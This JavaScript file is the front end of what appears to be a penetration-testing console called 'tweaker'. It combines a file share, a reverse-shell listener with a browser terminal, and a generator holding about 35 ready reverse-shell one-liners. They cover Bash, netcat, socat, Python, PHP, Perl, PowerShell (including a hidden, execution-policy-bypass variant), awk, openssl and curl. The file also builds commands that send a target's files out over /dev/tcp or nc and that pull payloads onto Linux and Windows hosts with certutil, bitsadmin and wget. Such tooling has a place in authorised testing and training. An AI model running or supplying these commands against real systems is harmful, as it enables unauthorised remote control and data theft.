// === State ===
let currentPath = "/";
let currentFile = null;
let ws = null;
let shellPollTimer = null;
let viewerCurrentPath = null;
let viewerCurrentMode = "text";
let viewerOffset = 0;
let viewerHasMore = false;
let viewerLoading = false;
let hexHL = [];

// === DOM ===
const tFiles = document.getElementById("tab-files");
const tShells = document.getElementById("tab-shells");
const fsDiv = document.getElementById("file-share");
const shDiv = document.getElementById("shell-handler");
const fileList = document.getElementById("file-list");
const shellList = document.getElementById("shell-list");
const ctxMenu = document.getElementById("ctx-menu");
const pathDisplay = document.getElementById("current-path");
const fileInput = document.getElementById("file-input");
const shellListView = document.getElementById("shell-list-view"); // legacy ref
const shellTerminal = document.getElementById("shell-terminal");
const termOutput = document.getElementById("terminal-output");
const termInput = document.getElementById("terminal-input");
const termTitle = document.getElementById("terminal-title");
const termBack = document.getElementById("terminal-back");
const catchInfo = document.getElementById("catch-info");
const catchStatus = document.getElementById("catch-status");
const catchCmds = document.getElementById("catch-cmds");
const fileViewer = document.getElementById("file-viewer");
const viewerBack = document.getElementById("viewer-back");
const viewerTitle = document.getElementById("viewer-title");
const viewerContent = document.getElementById("viewer-content");
const viewerInfo = document.getElementById("viewer-info");
const viewerTextBtn = document.getElementById("viewer-text");
const viewerHexBtn = document.getElementById("viewer-hex");
const toolbar = document.querySelector(".toolbar");
const tSettings = document.getElementById("tab-settings");
const settingsDiv = document.getElementById("settings-panel");
const settingHost = document.getElementById("setting-host");

// === Host helpers ===
function getHost() {
  return localStorage.getItem("tweaker_host") || location.host;
}
function getHostname() {
  const h = getHost();
  const i = h.lastIndexOf(":");
  return i > 0 ? h.substring(0, i) : h;
}

// === Tabs ===
const allTabs = [tFiles, tShells, tSettings];
const allPanels = [fsDiv, shDiv, settingsDiv];

function switchTab(tab, panel) {
  allTabs.forEach((t) => t.classList.remove("active"));
  allPanels.forEach((p) => p.classList.add("hidden"));
  tab.classList.add("active");
  panel.classList.remove("hidden");
  stopShellPolling();
}

tFiles.onclick = () => switchTab(tFiles, fsDiv);
tShells.onclick = () => {
  switchTab(tShells, shDiv);
  loadShells();
  startShellPolling();
};
tSettings.onclick = () => {
  switchTab(tSettings, settingsDiv);
  document.getElementById("settings-web-addr").textContent = location.host;
};

// === Helpers ===
function esc(s) {
  const d = document.createElement("div");
  d.textContent = s;
  return d.innerHTML;
}

function formatSize(bytes) {
  if (bytes === 0) return "0 B";
  const k = 1024;
  const sizes = ["B", "KB", "MB", "GB"];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return (bytes / Math.pow(k, i)).toFixed(i ? 1 : 0) + " " + sizes[i];
}

function copyText(text) {
  // 1) Clipboard API (HTTPS / localhost only)
  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(text).catch(() => showCopyModal(text));
    return;
  }
  // 2) execCommand fallback (works over HTTP on user gesture)
  const ta = document.createElement("textarea");
  ta.value = text;
  ta.style.position = "fixed";
  ta.style.left = "-9999px";
  document.body.appendChild(ta);
  ta.select();
  try {
    if (document.execCommand("copy")) {
      document.body.removeChild(ta);
      return;
    }
  } catch (_) {}
  document.body.removeChild(ta);
  // 3) Manual copy modal
  showCopyModal(text);
}

const copyModal = document.getElementById("copy-modal");
const copyModalText = document.getElementById("copy-modal-text");

function showCopyModal(text) {
  copyModalText.value = text;
  copyModal.classList.add("visible");
  copyModalText.focus();
  copyModalText.select();
}

function hideCopyModal() {
  copyModal.classList.remove("visible");
}

document.getElementById("copy-modal-close").onclick = hideCopyModal;
copyModal.addEventListener("click", (e) => {
  if (e.target === copyModal) hideCopyModal();
});

function makeCmdLine(cmd, container) {
  const div = document.createElement("div");
  div.className = "catch-cmd";
  div.innerHTML = "<code>" + esc(cmd) + '</code><span class="copy-tag">click to copy</span>';
  div.onclick = () => copyText(cmd);
  container.appendChild(div);
}

// === File Share ===
async function loadFiles(path) {
  currentPath = path || "/";
  pathDisplay.textContent = currentPath;
  try {
    const res = await fetch("/api/files?path=" + encodeURIComponent(currentPath));
    const data = await res.json();
    renderFiles(data.entries || []);
  } catch (e) {
    fileList.innerHTML = "<li>Error loading files</li>";
  }
}

function renderFiles(entries) {
  fileList.innerHTML = "";
  if (currentPath !== "/") {
    const li = document.createElement("li");
    li.textContent = "../";
    li.onclick = () => {
      const parent = currentPath.replace(/\/[^/]+\/?$/, "") || "/";
      loadFiles(parent);
    };
    fileList.appendChild(li);
  }
  entries.forEach((f) => {
    const li = document.createElement("li");
    const name = f.is_dir ? f.name + "/" : f.name;
    const size = f.is_dir ? "" : formatSize(f.size);
    li.innerHTML =
      "<span>" + esc(name) + '</span><span class="file-size">' + size + "</span>";
    li.dataset.name = f.name;
    if (f.is_dir) {
      li.ondblclick = () => {
        loadFiles(currentPath === "/" ? "/" + f.name : currentPath + "/" + f.name);
      };
    }
    if (!f.is_dir) {
      li.ondblclick = () => {
        const filePath = currentPath === "/" ? "/" + f.name : currentPath + "/" + f.name;
        viewFile(filePath, f.name, "text");
      };
      li.addEventListener("contextmenu", (e) => {
        e.preventDefault();
        currentFile = f.name;
        showCtxMenu(e.pageX, e.pageY, f.name);
      });
    }
    fileList.appendChild(li);
  });
}

// Upload
document.getElementById("upload-btn").onclick = () => fileInput.click();
fileInput.onchange = async () => {
  for (const file of fileInput.files) {
    const form = new FormData();
    form.append("file", file);
    await fetch("/api/files/upload?path=" + encodeURIComponent(currentPath), {
      method: "POST",
      body: form,
    });
  }
  fileInput.value = "";
  loadFiles(currentPath);
};

// New Folder
document.getElementById("newdir-btn").onclick = () => {
  const name = prompt("Folder name:");
  if (!name) return;
  const path = currentPath === "/" ? "/" + name : currentPath + "/" + name;
  fetch("/api/files/mkdir", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ path: path }),
  }).then(() => loadFiles(currentPath));
};

// Catch (receive file from target via /dev/tcp or nc)
document.getElementById("catch-btn").onclick = async () => {
  const filename = prompt("Save incoming file as:", "caught_file");
  if (!filename) return;

  const res = await fetch("/api/files/catch", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ filename: filename }),
  });
  const data = await res.json();
  const port = data.port;
  const hostname = getHostname();

  catchStatus.textContent = "Listening on :" + port + " (5 min timeout)";
  catchCmds.innerHTML = "";
  const cmds = [
    "cat /path/to/file > /dev/tcp/" + hostname + "/" + port,
    "nc " + hostname + " " + port + " < /path/to/file",
    "bash -c 'cat /path/to/file > /dev/tcp/" + hostname + "/" + port + "'",
  ];
  cmds.forEach((c) => makeCmdLine(c, catchCmds));
  catchInfo.classList.remove("hidden");
};

document.getElementById("catch-close").onclick = () => {
  catchInfo.classList.add("hidden");
};

// Path click -> root
pathDisplay.onclick = () => loadFiles("/");

// === File Viewer ===
async function viewFile(filePath, filename, mode) {
  mode = mode || "text";
  viewerCurrentPath = filePath;
  viewerCurrentMode = mode;
  viewerOffset = 0;
  viewerHasMore = false;
  viewerLoading = false;
  viewerContent.innerHTML = "";
  hexHL = [];

  viewerTitle.textContent = filename;
  viewerTextBtn.classList.toggle("active", mode === "text");
  viewerHexBtn.classList.toggle("active", mode === "hex");

  toolbar.classList.add("hidden");
  catchInfo.classList.add("hidden");
  fileList.classList.add("hidden");
  fileViewer.classList.remove("hidden");

  await loadViewerChunk();
}

async function loadViewerChunk() {
  if (viewerLoading) return;
  viewerLoading = true;

  try {
    const res = await fetch(
      "/api/files/preview?path=" + encodeURIComponent(viewerCurrentPath) +
      "&mode=" + viewerCurrentMode +
      "&offset=" + viewerOffset
    );
    const data = await res.json();

    if (viewerCurrentMode === "hex" && data.data) {
      const raw = atob(data.data);
      const bytes = new Uint8Array(raw.length);
      for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);
      viewerContent.insertAdjacentHTML("beforeend", buildHexHTML(bytes, data.offset));
    } else if (data.content !== undefined) {
      viewerContent.appendChild(document.createTextNode(data.content));
    }

    viewerOffset += data.read;
    viewerHasMore = data.has_more;

    if (viewerHasMore) {
      viewerInfo.textContent = formatSize(viewerOffset) + " / " + formatSize(data.size) + " — scroll for more";
    } else {
      viewerInfo.textContent = formatSize(data.size);
    }
    viewerInfo.classList.remove("hidden");
  } catch (e) {
    viewerInfo.textContent = "Error loading file";
    viewerInfo.classList.remove("hidden");
  }

  viewerLoading = false;
}

function buildHexHTML(bytes, startOffset) {
  const lines = [];
  for (let i = 0; i < bytes.length; i += 16) {
    let h = '<div class="hex-line"><span class="hex-offset">';
    h += (startOffset + i).toString(16).padStart(8, "0") + "  </span>";

    // hex bytes
    for (let j = 0; j < 16; j++) {
      if (j === 8) h += " ";
      if (i + j < bytes.length) {
        h += '<span class="hb" data-i="' + j + '">';
        h += bytes[i + j].toString(16).padStart(2, "0") + "</span> ";
      } else {
        h += "   ";
      }
    }

    // ascii
    h += '<span class="hex-sep"> |</span>';
    const end = Math.min(i + 16, bytes.length);
    for (let j = i; j < end; j++) {
      const b = bytes[j];
      let ch;
      if (b >= 0x20 && b <= 0x7e) {
        ch = String.fromCharCode(b);
        if (ch === "<") ch = "&lt;";
        else if (ch === ">") ch = "&gt;";
        else if (ch === "&") ch = "&amp;";
        else if (ch === '"') ch = "&quot;";
      } else {
        ch = ".";
      }
      h += '<span class="hc" data-i="' + (j - i) + '">' + ch + "</span>";
    }
    h += '<span class="hex-sep">|</span></div>';
    lines.push(h);
  }
  return lines.join("");
}

// Hex hover — highlight matching byte ↔ ascii
viewerContent.addEventListener("mouseover", (e) => {
  const t = e.target;
  if (!t.dataset || t.dataset.i === undefined) return;
  const line = t.closest(".hex-line");
  if (!line) return;
  clearHexHL();
  const idx = t.dataset.i;
  const hb = line.querySelector('.hb[data-i="' + idx + '"]');
  const hc = line.querySelector('.hc[data-i="' + idx + '"]');
  if (hb) { hb.classList.add("hex-hl"); hexHL.push(hb); }
  if (hc) { hc.classList.add("hex-hl"); hexHL.push(hc); }
});

viewerContent.addEventListener("mouseout", (e) => {
  if (e.target.dataset && e.target.dataset.i !== undefined) clearHexHL();
});

function clearHexHL() {
  hexHL.forEach((el) => el.classList.remove("hex-hl"));
  hexHL = [];
}

// Auto-load next chunk on scroll
viewerContent.addEventListener("scroll", () => {
  if (!viewerHasMore || viewerLoading) return;
  const el = viewerContent;
  if (el.scrollTop + el.clientHeight >= el.scrollHeight - 50) {
    loadViewerChunk();
  }
});

viewerBack.onclick = () => {
  fileViewer.classList.add("hidden");
  toolbar.classList.remove("hidden");
  fileList.classList.remove("hidden");
};

viewerTextBtn.onclick = () => {
  viewFile(viewerCurrentPath, viewerTitle.textContent, "text");
};

viewerHexBtn.onclick = () => {
  viewFile(viewerCurrentPath, viewerTitle.textContent, "hex");
};

// === Context Menu ===
function showCtxMenu(x, y, filename) {
  ctxMenu.style.top = y + "px";
  ctxMenu.style.left = x + "px";
  ctxMenu.style.display = "block";

  const host = getHost();
  const hostname = getHostname();
  const filePath =
    currentPath === "/" ? "/" + filename : currentPath + "/" + filename;
  const url = "http://" + host + "/dl" + filePath;

  // --- Linux commands ---
  const linuxEl = document.getElementById("linux-cmds");
  linuxEl.innerHTML = "";

  const linuxHttp = [
    "wget " + url + " -O " + filename,
    "curl " + url + " -o " + filename,
    "python3 -c \"import urllib.request;urllib.request.urlretrieve('" + url + "','" + filename + "')\"",
    "python -c \"import urllib;urllib.urlretrieve('" + url + "','" + filename + "')\"",
    "php -r \"file_put_contents('" + filename + "',file_get_contents('" + url + "'));\"",
  ];

  linuxHttp.forEach((cmd) => {
    const li = document.createElement("li");
    li.textContent = cmd;
    li.title = cmd;
    li.onclick = (e) => { e.stopPropagation(); copyText(cmd); ctxMenu.style.display = "none"; };
    linuxEl.appendChild(li);
  });

  // /dev/tcp and nc — open port, serve file
  ["/dev/tcp", "nc"].forEach((tool) => {
    const li = document.createElement("li");
    li.textContent = tool + " (open port)";
    li.onclick = async (e) => {
      e.stopPropagation();
      const res = await fetch("/api/files/serve", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ path: filePath }),
      });
      const data = await res.json();
      const port = data.port;
      let cmd;
      if (tool === "/dev/tcp") {
        cmd = "cat < /dev/tcp/" + hostname + "/" + port + " > " + filename;
      } else {
        cmd = "nc " + hostname + " " + port + " > " + filename;
      }
      copyText(cmd);
      ctxMenu.style.display = "none";
    };
    linuxEl.appendChild(li);
  });

  // --- Windows commands ---
  const winEl = document.getElementById("windows-cmds");
  winEl.innerHTML = "";

  const winCmds = [
    "certutil -urlcache -split -f " + url + " " + filename,
    "powershell -c \"iwr " + url + " -OutFile " + filename + "\"",
    "powershell -c \"(New-Object Net.WebClient).DownloadFile('" + url + "','" + filename + "')\"",
    "bitsadmin /transfer n /priority high " + url + " %cd%\\" + filename,
    "powershell -c \"Start-BitsTransfer -Source '" + url + "' -Destination '" + filename + "'\"",
  ];

  winCmds.forEach((cmd) => {
    const li = document.createElement("li");
    li.textContent = cmd;
    li.title = cmd;
    li.onclick = (e) => { e.stopPropagation(); copyText(cmd); ctxMenu.style.display = "none"; };
    winEl.appendChild(li);
  });
}

document.addEventListener("click", (e) => {
  if (!e.target.closest(".context-menu")) ctxMenu.style.display = "none";
});

ctxMenu.querySelectorAll("li[data-action]").forEach((item) => {
  item.addEventListener("click", () => {
    const action = item.dataset.action;
    const filePath =
      currentPath === "/" ? "/" + currentFile : currentPath + "/" + currentFile;

    if (action === "view") {
      viewFile(filePath, currentFile, "text");
    } else if (action === "download") {
      window.open("/api/files/download?path=" + encodeURIComponent(filePath));
    } else if (action === "rename") {
      const newName = prompt("New name:", currentFile);
      if (!newName || newName === currentFile) return;
      const newPath =
        currentPath === "/" ? "/" + newName : currentPath + "/" + newName;
      fetch("/api/files/rename", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ old_path: filePath, new_path: newPath }),
      }).then(() => loadFiles(currentPath));
    } else if (action === "delete") {
      if (!confirm("Delete " + currentFile + "?")) return;
      fetch("/api/files?path=" + encodeURIComponent(filePath), {
        method: "DELETE",
      }).then(() => loadFiles(currentPath));
    }
    ctxMenu.style.display = "none";
  });
});

// === Reverse Shell Generator ===
const REVSHELLS = [
  {cat:"Bash",name:"Bash -i",cmd:`{shell} -i >& /dev/tcp/{ip}/{port} 0>&1`,os:["linux"]},
  {cat:"Bash",name:"Bash 196",cmd:`0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196`,os:["linux"]},
  {cat:"Bash",name:"Bash 5",cmd:`{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5`,os:["linux"]},
  {cat:"Bash",name:"Bash UDP",cmd:`{shell} -i >& /dev/udp/{ip}/{port} 0>&1`,os:["linux"]},
  {cat:"Netcat",name:"nc mkfifo",cmd:`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f`,os:["linux"]},
  {cat:"Netcat",name:"nc -e",cmd:`nc {ip} {port} -e {shell}`,os:["linux"]},
  {cat:"Netcat",name:"nc -c",cmd:`nc -c {shell} {ip} {port}`,os:["linux"]},
  {cat:"Netcat",name:"nc.exe -e",cmd:`nc.exe {ip} {port} -e {shell}`,os:["windows"]},
  {cat:"Netcat",name:"ncat -e",cmd:`ncat {ip} {port} -e {shell}`,os:["linux"]},
  {cat:"Netcat",name:"ncat.exe",cmd:`ncat.exe {ip} {port} -e {shell}`,os:["windows"]},
  {cat:"Netcat",name:"BusyBox nc",cmd:`busybox nc {ip} {port} -e {shell}`,os:["linux"]},
  {cat:"Socat",name:"socat",cmd:`socat TCP:{ip}:{port} EXEC:{shell}`,os:["linux"]},
  {cat:"Socat",name:"socat TTY",cmd:`socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane`,os:["linux"]},
  {cat:"Python",name:"Python3 short",cmd:`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")'`,os:["linux"]},
  {cat:"Python",name:"Python3",cmd:`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("{shell}")'`,os:["linux"]},
  {cat:"Python",name:"Python2",cmd:`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("{shell}")'`,os:["linux"]},
  {cat:"Python",name:"Python3 Win",cmd:`python3 -c "import socket,subprocess,threading;s=socket.socket();s.connect(('{ip}',{port}));[threading.Thread(target=lambda f=f:exec('import os;[os.dup2(s.fileno(),fd)for fd in(0,1,2)]')or subprocess.call(['{shell}'])).start()for _ in[0]]"`,os:["windows"]},
  {cat:"PHP",name:"PHP exec",cmd:`php -r '$sock=fsockopen("{ip}",{port});exec("{shell} <&3 >&3 2>&3");'`,os:["linux"]},
  {cat:"PHP",name:"PHP system",cmd:`php -r '$sock=fsockopen("{ip}",{port});system("{shell} <&3 >&3 2>&3");'`,os:["linux"]},
  {cat:"PHP",name:"PHP passthru",cmd:`php -r '$sock=fsockopen("{ip}",{port});passthru("{shell} <&3 >&3 2>&3");'`,os:["linux"]},
  {cat:"PHP",name:"PHP popen",cmd:`php -r '$sock=fsockopen("{ip}",{port});popen("{shell} -i <&3 >&3 2>&3","r");'`,os:["linux"]},
  {cat:"Perl",name:"Perl",cmd:`perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};'`,os:["linux"]},
  {cat:"Perl",name:"Perl no sh",cmd:`perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,os:["linux"]},
  {cat:"Ruby",name:"Ruby",cmd:`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))'`,os:["linux"]},
  {cat:"Node.js",name:"Node.js",cmd:`require('child_process').exec('nc -e {shell} {ip} {port}')`,os:["linux"]},
  {cat:"Lua",name:"Lua",cmd:`lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');"`,os:["linux"]},
  {cat:"PowerShell",name:"PS #1",cmd:`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb = (iex $data 2>&1 | Out-String);$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendbyte,0,$sendbyte.Length);$s.Flush()};$client.Close()"`,os:["windows"]},
  {cat:"PowerShell",name:"PS #2 hidden",cmd:`powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{ip}',{port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"`,os:["windows"]},
  {cat:"Other",name:"Awk",cmd:`awk 'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,os:["linux"]},
  {cat:"Other",name:"OpenSSL",cmd:`mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s`,os:["linux"]},
  {cat:"Other",name:"Zsh",cmd:`zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`,os:["linux"]},
  {cat:"Other",name:"Telnet",cmd:`TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF`,os:["linux"]},
  {cat:"Other",name:"Curl",cmd:`C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null`,os:["linux"]},
];

const shellMainView = document.getElementById("shell-main-view");
const shellGenToggle = document.getElementById("shell-gen-toggle");
const shellGen = document.getElementById("shell-gen");
const shellGenList = document.getElementById("shell-gen-list");
const rshIp = document.getElementById("rsh-ip");
const rshPort = document.getElementById("rsh-port");
const rshShell = document.getElementById("rsh-shell");
let shellGenOsFilter = "all";

// Init generator defaults
rshIp.value = getHostname();
rshIp.placeholder = getHostname();
rshPort.value = window.TWEAKER.shellPort;

shellGenToggle.onclick = () => {
  const open = shellGen.classList.toggle("hidden");
  shellGenToggle.innerHTML = (open ? "&#9654;" : "&#9660;") + " Shell Generator";
  if (!open) renderShellGen();
};

// Re-render on any input change
rshIp.addEventListener("input", renderShellGen);
rshPort.addEventListener("input", renderShellGen);
rshShell.addEventListener("change", renderShellGen);

// OS filter buttons
document.querySelectorAll(".filter-btn").forEach((btn) => {
  btn.addEventListener("click", () => {
    document.querySelectorAll(".filter-btn").forEach((b) => b.classList.remove("active"));
    btn.classList.add("active");
    shellGenOsFilter = btn.dataset.os;
    renderShellGen();
  });
});

function renderShellGen() {
  const ip = rshIp.value || getHostname();
  const port = rshPort.value || window.TWEAKER.shellPort;
  const shell = rshShell.value;
  const os = shellGenOsFilter;

  const groups = {};
  REVSHELLS.forEach((t) => {
    if (os !== "all" && !t.os.includes(os)) return;
    if (!groups[t.cat]) groups[t.cat] = [];
    const cmd = t.cmd
      .replace(/\{ip\}/g, ip)
      .replace(/\{port\}/g, port)
      .replace(/\{shell\}/g, shell);
    groups[t.cat].push({ name: t.name, cmd });
  });

  shellGenList.innerHTML = "";
  Object.keys(groups).forEach((cat) => {
    const hdr = document.createElement("div");
    hdr.className = "shell-gen-cat-header";
    hdr.textContent = "\u25BE " + cat + " (" + groups[cat].length + ")";
    const list = document.createElement("div");

    hdr.onclick = () => {
      const collapsed = list.classList.toggle("hidden");
      hdr.textContent = (collapsed ? "\u25B8 " : "\u25BE ") + cat + " (" + groups[cat].length + ")";
    };

    groups[cat].forEach((item) => {
      const div = document.createElement("div");
      div.className = "shell-gen-cmd";
      div.innerHTML =
        '<span class="shell-gen-name">' + esc(item.name) + "</span><code>" + esc(item.cmd) + "</code>";
      div.title = item.cmd;
      div.onclick = () => copyText(item.cmd);
      list.appendChild(div);
    });

    shellGenList.appendChild(hdr);
    shellGenList.appendChild(list);
  });
}

// === Active Shells ===
async function loadShells() {
  try {
    const res = await fetch("/api/shells");
    const data = await res.json();
    renderShells(data.shells || []);
  } catch (e) {
    shellList.innerHTML = "<li>Error loading shells</li>";
  }
}

function renderShells(shells) {
  shellList.innerHTML = "";
  if (shells.length === 0) {
    shellList.innerHTML = "<li>No active shells</li>";
    return;
  }
  shells.forEach((s) => {
    const li = document.createElement("li");
    li.innerHTML =
      "<span>#" + s.id + " &mdash; " + esc(s.remote_addr) + "</span>" +
      '<span class="shell-actions">' +
      '<button onclick="connectShell(' + s.id + ",'" + esc(s.remote_addr) + "'" + ')">Connect</button>' +
      '<button onclick="killShell(' + s.id + ')">Kill</button>' +
      "</span>";
    shellList.appendChild(li);
  });
}

function startShellPolling() {
  stopShellPolling();
  shellPollTimer = setInterval(loadShells, 3000);
}

function stopShellPolling() {
  if (shellPollTimer) {
    clearInterval(shellPollTimer);
    shellPollTimer = null;
  }
}

window.killShell = async function (id) {
  await fetch("/api/shells/" + id, { method: "DELETE" });
  loadShells();
};

// === Terminal ===
window.connectShell = function (id, addr) {
  stopShellPolling();
  shellMainView.classList.add("hidden");
  shellTerminal.classList.remove("hidden");
  termTitle.textContent = "Shell #" + id + " \u2014 " + addr;
  termOutput.textContent = "";

  const proto = location.protocol === "https:" ? "wss:" : "ws:";
  ws = new WebSocket(proto + "//" + location.host + "/ws/shell/" + id);

  ws.onmessage = (e) => {
    termOutput.textContent += e.data;
    termOutput.scrollTop = termOutput.scrollHeight;
  };

  ws.onclose = () => {
    termOutput.textContent += "\n[Connection closed]\n";
  };

  termInput.focus();
};

termInput.addEventListener("keydown", (e) => {
  if (e.key === "Enter") {
    if (ws && ws.readyState === WebSocket.OPEN) {
      ws.send(termInput.value + "\n");
    }
    termInput.value = "";
  }
});

termBack.onclick = () => {
  if (ws) {
    ws.close();
    ws = null;
  }
  shellTerminal.classList.add("hidden");
  shellMainView.classList.remove("hidden");
  loadShells();
  startShellPolling();
};

// === Settings ===
settingHost.value = localStorage.getItem("tweaker_host") || "";
settingHost.placeholder = location.host;
settingHost.addEventListener("input", () => {
  const val = settingHost.value.trim();
  if (val) {
    localStorage.setItem("tweaker_host", val);
  } else {
    localStorage.removeItem("tweaker_host");
  }
});

// === Init ===
loadFiles("/");
